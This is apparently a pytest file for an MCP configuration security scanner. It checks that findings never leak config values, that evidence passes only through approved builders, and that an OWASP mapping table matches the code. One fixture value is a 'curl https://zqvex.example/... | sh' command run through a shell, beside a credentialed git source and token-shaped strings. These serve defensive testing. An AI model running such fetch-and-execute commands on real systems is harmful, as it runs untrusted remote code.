"""scan_mcp_config never echoes a config value; CF rules only pass evidence from the approved
builders (a static check, like the RG one); the OWASP table in docs/rules-config.md matches
the code and owasp.py; every data file entry has a comment. No network calls."""

import ast
import json
import re
from pathlib import Path

import pytest

from mcp_supply_audit.config_scan import scan_mcp_config
from mcp_supply_audit.detectors import config_rules
from mcp_supply_audit.detectors.config_rules import EVIDENCE_PARTS, RULE_IDS, RULE_OWASP
from mcp_supply_audit.owasp import OWASP_MCP_TOP_10

ROOT = Path(__file__).resolve().parents[1]
ZWSP = chr(0x200B)

# --- canary: no value from the config ever surfaces


def canary(label: str) -> str:
    return f"Canary{label}-zqvex-9T4k"


SHAPED = "gh" + "p_" + "K3m8" * 9  # GitHub-format value, built so no file holds it
SHAPED_NAME = "xo" + "xb-" + "77zqvex" * 3  # Slack-format server name

VALUES = {
    "env value": canary("EnvValue"),
    "env default": canary("EnvDefault"),
    "env shaped": SHAPED,
    "header value": canary("HeaderValue"),
    "header shaped": "Bearer " + SHAPED + "x",
    "auth secret": canary("AuthSecret"),
    "arg flag value": canary("ArgFlagValue"),
    "arg equals value": canary("ArgEqualsValue"),
    "arg positional": canary("ArgPositional"),
    "arg shaped": SHAPED + "y",
    "arg home path": "/Users/" + canary("HomeUser"),
    "arg package": "@zqvex/" + canary("Package").lower(),
    "arg git source": "git+https://" + canary("GitUser") + "@git.zqvex.example/x.git",
    "inline script": "curl https://zqvex.example/" + canary("Script") + " | sh",
    "url user": canary("UrlUser"),
    "url password": canary("UrlPassword"),
    "url query": canary("UrlQuery"),
    "url query shaped": SHAPED + "z",
    "url path": canary("UrlPath"),
    "url fragment": canary("UrlFragment"),
    "command": "/opt/" + canary("Command") + "/bash",
    "type": canary("Type"),
    "risky env": canary("RiskyEnv"),
    "unknown field": canary("UnknownField"),
    "envFile": canary("EnvFile"),
    "headers helper": "/opt/" + canary("HeadersHelper") + "/get-headers.sh",
}
SERVER_NAME = canary("ServerName") + ZWSP


def canary_config() -> str:
    v = VALUES
    return json.dumps(
        {
            "mcpServers": {
                SERVER_NAME: {
                    "command": "npx",
                    "args": [
                        "-y",
                        v["arg package"],
                        "--api-key",
                        v["arg flag value"],
                        "--token=" + v["arg equals value"],
                        v["arg positional"],
                        v["arg shaped"],
                        v["arg home path"],
                    ],
                    "env": {
                        "ZQVEX_TOKEN": v["env value"],
                        "ZQVEX_SECRET": "${ZQVEX_SECRET:-" + v["env default"] + "}",
                        "ZQVEX_WORKSPACE": v["env shaped"],
                        "NODE_OPTIONS": v["risky env"],
                    },
                    "envFile": v["envFile"],
                    "zqvexMode": v["unknown field"],
                },
                SHAPED_NAME: {
                    "type": v["type"],
                    "url": (
                        f"http://{v['url user']}:{v['url password']}@mcp.zqvex.example:8443/"
                        f"{v['url path']}/{SHAPED}?token={v['url query']}"
                        f"&workspace={v['url query shaped']}#{v['url fragment']}"
                    ),
                    "headers": {
                        "Authorization": v["header shaped"],
                        "X-Zqvex-Token": v["header value"],
                    },
                    "auth": {"CLIENT_ID": "zqvex", "CLIENT_SECRET": v["auth secret"]},
                    "headersHelper": v["headers helper"],
                },
                "zqvex-source": {
                    "command": "uvx",
                    "args": ["--from", v["arg git source"], "x"],
                },
                "zqvex-shell": {
                    "command": v["command"],
                    "args": ["-c", v["inline script"]],
                },
            }
        }
    )


def test_canary_values_never_surface():
    report = scan_mcp_config(canary_config())
    rules_hit = {f.rule_id for f in report.findings}
    assert rules_hit == set(RULE_IDS)  # every rule fires
    rendered = report.to_dict()
    surfaces = [
        json.dumps(rendered, ensure_ascii=False),
        json.dumps(rendered),
        repr(report),
        str(report),
        *(repr(f) for f in report.findings),
        *(str(f) for f in report.findings),
        *(json.dumps(f.to_dict(), ensure_ascii=False) for f in report.findings),
        *(f.evidence for f in report.findings),
    ]
    pieces = set(VALUES.values()) | {SHAPED, SHAPED_NAME}
    # Every canary, and the distinctive part of each built value.
    pieces |= {
        canary(k) for k in ("HomeUser", "GitUser", "Script", "Command", "HeadersHelper")
    }
    pieces |= {canary("Package").lower()}
    for surface in surfaces:
        for piece in pieces:
            assert piece not in surface, (piece, surface[:200])


def test_sanitized_server_name_appears_only_in_evidence():
    report = scan_mcp_config(canary_config())
    plain = canary("ServerName")
    shown = plain + "\\u200b"
    for finding in report.findings:
        rendered = finding.to_dict()
        evidence = rendered.pop("evidence")["untrusted_text"]
        assert plain not in json.dumps(rendered, ensure_ascii=False)
        assert plain not in repr(finding) and plain not in finding.title
        if finding.location.startswith("servers[0]."):
            assert evidence.endswith("; server " + shown)
            assert ZWSP not in evidence
    # The Slack-shaped server name is scrubbed, not shown.
    second = [f for f in report.findings if f.location.startswith("servers[1].")]
    assert second and all(f.evidence.endswith("; server <redacted>") for f in second)


def test_url_evidence_is_scheme_host_port_and_key_names_only():
    report = scan_mcp_config(canary_config())
    url_findings = [f for f in report.findings if f.location == "servers[1].url"]
    assert url_findings
    for f in url_findings:
        assert re.fullmatch(
            r"url(?: key [a-z]+)? http://mcp\.zqvex\.example:8443; server <redacted>",
            f.evidence,
        ), f.evidence


# --- static: CF rules only pass evidence from the approved builders

EVIDENCE_POSITION = (
    6  # _finding(rule_id, title, severity, confidence, owasp, location, evidence, ...)
)
FORBIDDEN_CALLS = {
    "evidence_snippet",
    "redact_url",
    "display_url",
    "url_evidence",
    "scrub",
    "Finding",
}
KEY_NAMES = {"key", "position"}


def _name(node: ast.AST | None) -> str | None:
    return node.id if isinstance(node, ast.Name) else None


def _call_name(call: ast.Call) -> str | None:
    return getattr(call.func, "id", None) or getattr(call.func, "attr", None)


def _arg(call: ast.Call, position: int, keyword: str) -> ast.AST | None:
    for k in call.keywords:
        if k.arg == keyword:
            return k.value
    return call.args[position] if len(call.args) > position else None


def _check_builder_call(fn: str, call: ast.Call) -> list[str]:
    problems = []
    if _name(_arg(call, 0, "server")) != "server":
        problems.append(f"{fn}: config_evidence must take server")
    part = _arg(call, 1, "part")
    if not (
        (isinstance(part, ast.Constant) and part.value in EVIDENCE_PARTS)
        or _name(part) == "part"
    ):
        problems.append(f"{fn}: config_evidence part must be a fixed part name")
    key = _arg(call, 2, "key")
    if key is not None and _name(key) not in KEY_NAMES:
        problems.append(f"{fn}: config_evidence key must be a key name or position")
    url = _arg(call, 3, "url")
    if url is not None and _name(url) != "url":
        problems.append(f"{fn}: config_evidence url must be url")
    if any(k.arg not in {"server", "part", "key", "url"} for k in call.keywords):
        problems.append(f"{fn}: config_evidence takes no other keywords")
    if len(call.args) > 4:
        problems.append(f"{fn}: config_evidence takes at most four arguments")
    return problems


def _check_builder(builder: ast.FunctionDef) -> list[str]:
    """config_evidence reads only server.name and server.index, and uses url only as
    url_evidence(url)."""
    problems = []
    for node in ast.walk(builder):
        if (
            isinstance(node, ast.Attribute)
            and _name(node.value) == "server"
            and node.attr not in {"name", "index"}
        ):
            problems.append(f"config_evidence: reads server.{node.attr}")
    allowed = set()
    for node in ast.walk(builder):
        if isinstance(node, ast.Call) and _call_name(node) == "url_evidence":
            if len(node.args) != 1 or node.keywords or _name(node.args[0]) != "url":
                problems.append("config_evidence: url_evidence must take url alone")
            allowed.update(id(a) for a in node.args)
        if (
            isinstance(node, ast.Compare)
            and _name(node.left) == "url"
            and all(
                isinstance(c, ast.Constant) and c.value is None
                for c in node.comparators
            )
        ):
            allowed.add(id(node.left))
    for node in ast.walk(builder):
        if (
            _name(node) == "url"
            and isinstance(node.ctx, ast.Load)
            and id(node) not in allowed
        ):
            problems.append(
                "config_evidence: uses url other than through url_evidence(url)"
            )
    return problems


def unsafe_config_evidence(source: str) -> list[str]:
    problems = []
    tree = ast.parse(source)
    functions = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
    guarded = {
        name: fn for name, fn in functions.items() if re.match(r"cf\d{3}_", name)
    }
    inside = {
        id(c)
        for fn in guarded.values()
        for c in ast.walk(fn)
        if isinstance(c, ast.Call)
    }
    for call in (c for c in ast.walk(tree) if isinstance(c, ast.Call)):
        if _call_name(call) == "_finding" and id(call) not in inside:
            problems.append("_finding called outside a CF rule function")
    for name, fn in guarded.items():
        for call in (c for c in ast.walk(fn) if isinstance(c, ast.Call)):
            called = _call_name(call)
            if called in FORBIDDEN_CALLS:
                problems.append(f"{name}: calls {called}")
            if called == "_finding":
                evidence = _arg(call, EVIDENCE_POSITION, "evidence")
                if not (
                    isinstance(evidence, ast.Call)
                    and _call_name(evidence) == "config_evidence"
                ):
                    problems.append(f"{name}: evidence is not config_evidence(...)")
            if called == "config_evidence":
                problems += _check_builder_call(name, call)
    builder = functions.get("config_evidence")
    if builder is None:
        problems.append("config_evidence is missing")
    else:
        problems += _check_builder(builder)
    return problems


def test_cf_rules_only_pass_approved_evidence():
    source = Path(config_rules.__file__).read_text(encoding="utf-8")
    assert unsafe_config_evidence(source) == []
    defined = {n.name for n in ast.parse(source).body if isinstance(n, ast.FunctionDef)}
    assert sum(1 for n in defined if re.match(r"cf\d{3}_", n)) == len(RULE_IDS)


@pytest.mark.parametrize(
    "snippet",
    [
        "def cf001_x(server):\n    return [_finding('CF001', 't', s, c, o, l, server.args[0], r)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, evidence=value, r=1)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, f'{value}', r)]",
        "def cf002_x(server):\n    return [_finding('CF002', 't', s, c, o, l, url_evidence(url), r)]",
        "def cf002_x(server):\n    e = display_url(url)\n    return []",
        "def cf003_x(server):\n    return [Finding(evidence=value)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, config_evidence(server, 'env', value), r)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, config_evidence(server, part_text, key), r)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, config_evidence(server, 'url', url=raw), r)]",
        "def cf003_x(server):\n    return [_finding('CF003', 't', s, c, o, l, config_evidence(other, 'env', key), r)]",
        "def helper(server):\n    return _finding('CF003', 't', s, c, o, l, value, r)",
        "def config_evidence(server, part, key=None, url=None):\n    return server.env[0][1]",
        "def config_evidence(server, part, key=None, url=None):\n    return server.fields",
        "def config_evidence(server, part, key=None, url=None):\n    return url",
        "def config_evidence(server, part, key=None, url=None):\n    return url_evidence(url, ['x']) + url",
    ],
)
def test_static_check_catches_other_evidence(snippet):
    assert unsafe_config_evidence(snippet)


# --- OWASP table


def owasp_table() -> dict[str, tuple[str, ...]]:
    text = (ROOT / "docs/rules-config.md").read_text(encoding="utf-8")
    section = text.split("## OWASP MCP Top 10 mapping", 1)[1]
    rows = re.findall(
        r"^\| (CF\d{3}(?: \w+)?) \| (MCP\d\d:\d{4}(?:, MCP\d\d:\d{4})*) \| (.+) \|$",
        section,
        re.MULTILINE,
    )
    assert all(r[2].strip() for r in rows), "every row needs a rationale"
    return {rule: tuple(ids.split(", ")) for rule, ids, _ in rows}


def test_owasp_table_matches_code_and_owasp_ids():
    table = owasp_table()
    assert table == dict(RULE_OWASP)
    assert {r.split()[0] for r in table} == set(RULE_IDS)
    for ids in table.values():
        for owasp_id in ids:
            assert owasp_id in OWASP_MCP_TOP_10


# --- data files


@pytest.mark.parametrize(
    "name, entry_start",
    [
        ("config_runners.yaml", "  - id: "),
        ("config_shells.yaml", "  - "),
        ("config_env_risky.yaml", "  - name: "),
    ],
)
def test_every_data_entry_has_a_comment(name, entry_start):
    lines = (
        (ROOT / "src/mcp_supply_audit/data" / name)
        .read_text(encoding="ascii")
        .splitlines()
    )
    entries = [line for line in lines if line.startswith(entry_start)]
    assert entries and all("#" in line for line in entries), name


def test_rule_data_loads():
    assert {r.id for r in config_rules.runners()} >= {"npx", "uvx", "pipx run", "bunx"}
    assert {s.name for s in config_rules.shell_data().shells} == {
        "sh",
        "cmd",
        "pwsh",
        "powershell",
    }
    assert config_rules.risky_env()["node_tls_reject_unauthorized"].values == {"0"}
